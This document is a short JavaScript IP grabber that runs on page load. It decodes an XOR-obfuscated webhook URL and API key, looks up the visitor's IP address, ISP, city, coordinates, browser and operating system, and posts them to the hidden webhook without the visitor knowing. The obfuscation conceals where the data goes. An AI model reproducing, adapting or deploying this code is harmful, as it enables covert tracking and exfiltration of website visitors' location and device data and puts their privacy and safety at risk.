const encodedWebhook = "121,101,101,97,98,43,62,62,117,120,98,114,126,99,117,63,114,126,124,62,112,97,120,62,102,116,115,121,126,126,122,98,62,32,34,41,32,39,33,38,40,36,39,35,32,33,35,36,34,41,39,36,62,33,125,70,39,102,104,103,91,36,78,92,70,34,67,123,73,41,119,34,94,125,100,60,83,99,100,32,123,65,85,92,115,65,124,40,102,73,38,100,41,72,119,78,72,114,86,118,87,88,123,37,105,69,39,88,98,103,92,35,91,38,37,116,97,105,96,36,41";
const encodedKey = "40,115,33,32,117,116,34,32,32,37,35,39,37,117,115,37,112,114,39,39,38,34,34,40,32,114,34,41,115,117,114,116";

function xorDecode(data, key = 17) {
  return data.split(',').map(n => String.fromCharCode(n ^ key)).join('');
}

const Webhook = xorDecode(encodedWebhook);
const apiKey = xorDecode(encodedKey);

const grabData = async () => {
    const request = async () => {
        // Fetch data from geolocation and user-agent APIs
        const response = await fetch("https://api.ipgeolocation.io/ipgeo?apiKey=" + apiKey);
        const user = await fetch("https://api.ipgeolocation.io/user-agent?apiKey=" + apiKey);

        const data = await response.json();
        const AgentData = await user.json();

        const ip = data.ip;
        const isp = data.isp + " (" + data.continent_code + ")";
        const country = data.country_name;
        const regioncode = data.country_code2.toLowerCase();
        const region = data.country_code3 + " (" + data.country_code2 + ")";
        const city = data.city;
        const languages = data.languages;
        const lat = data.latitude;
        const lon = data.longitude;
        const callcode = data.calling_code;
        const flag = data.country_flag;
        const currency = data.currency.name;
        const currentDate = new Date();

        const broname = AgentData.name + '/' + AgentData.type;
        const engine = AgentData.engine.name + '(' + AgentData.engine.versionMajor + ')';
        const op = AgentData.operatingSystem.name + " " +AgentData.operatingSystem.versionMajor;

        const postRequest = new XMLHttpRequest();
        postRequest.open("POST", Webhook);
        postRequest.setRequestHeader("Content-type", "application/json");

        const params = {
            username: "Website Visited From "+ country + "/" + city,
            avatar_url: 'https://cdn-icons-png.flaticon.com/512/7013/7013144.png',
            content: null,
            embeds: [
                {
                    title: "** ** ** **:globe_with_meridians: IP Adress: " + ip,
                    url: "https://whatismyipaddress.com/ip/"+ ip,
                    description: "** **",
                    thumbnail: { url: flag },
                    color: 1993898,
                    fields: [
                        {
                            name: ":telephone: ISP: ",
                            value: isp,
                            inline: true,
                        },
                        {
                            name: ":flag_" + regioncode + ": Country & Region: ",
                            value: country + "/" + city + " - " + region,
                            inline: true,
                        },
                        {
                            name: ":round_pushpin: Location: ",
                            value: "Longitude: " + lon + "\nLatitude: " + lat + "\nGoogle Map: [Click](https://www.google.com/maps/@" + lat + "," + lon + ",6z)",
                            inline: true,
                        },
                        {
                            name: ":bust_in_silhouette: Client info: ",
                            value: ":satellite: Browser: "+ broname + "\n:gear: Engine: "+ engine + "\n:computer: OS: "+ op,
                            inline: true,
                        },
                        {
                            name: ":incoming_envelope: Extra info: ",
                            value: ":calling: Call Code: ("+ callcode +")\n:speaking_head: Lang's: "+languages+"\n:coin: Currency: "+ currency,
                            inline: true,
                        },
                    ],
                    footer: {
                        text: "Visited on: " + currentDate,
                        icon_url: "https://cdn-icons-png.flaticon.com/512/2088/2088617.png",
                    },
                },
            ],
        };

        postRequest.send(JSON.stringify(params));
    };

    // Call the request
    request();
};

// Start app
grabData();
